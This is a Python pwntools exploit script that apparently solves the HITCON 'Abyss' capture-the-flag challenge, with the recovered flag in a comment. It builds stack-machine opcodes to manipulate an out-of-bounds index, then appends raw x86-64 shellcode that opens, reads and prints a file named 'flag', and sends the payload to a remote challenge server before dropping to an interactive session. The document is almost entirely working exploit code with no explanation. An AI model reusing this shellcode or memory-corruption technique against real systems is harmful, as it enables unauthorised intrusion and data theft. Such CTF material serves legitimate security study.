#hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
from pwn import *

def dup_():
    return chr(0x24)
def pop_():
    return chr(0x25)
def and_():
    return chr(0x26)
def mul():
    return chr(0x2a)
def add():
    return chr(0x2b)
def write_():
    return chr(0x2c)
def minus():
    return chr(0x2d)
def writed():
    return chr(0x2e)
def div_():
    return chr(0x2f)
def store():
    return chr(0x3a)
def fetch():
    return chr(0x3b)
def eql():
    return chr(0x3d)
def gt():
    return chr(0x3e)
def rot():
    return chr(0x40)
def swap_():
    return chr(0x5c)
def neq():
    return chr(0x5f)
def or_():
    return chr(0x7c)
def not_():
    return chr(0x7e)

offset = 0x202aee

shellcode = "\x48\x31\xC0\x50\x50\x5E\x5E\x48\xBF\x66\x6C\x61\x67\x00\x00\x00\x00\x57\x54\x5F\xB0\x02\x0F\x05\x48\x89\xC7\x48\x8D\x74\x24\x30\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x8D\x74\x24\x30\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

#r = process("./user.elf")
#r = process(["./hypervisor.elf", "kernel.bin", "ld.so.2", "./user.elf"])
r = remote("35.200.23.198", 31733)

raw_input("?")
r.recvuntil("Once you get into the Abyss, you have no choice but keep going down.\n")
payload = str(0xffffffe4)
payload += swap_()
payload += swap_()
payload += pop_()
payload += str(offset)
payload += add()
payload += swap_()
payload += pop_()
payload += swap_()
payload += rot()
payload += write_()
payload = payload.ljust(0x200, "\x00")
payload += shellcode
r.sendline(payload)
r.interactive()
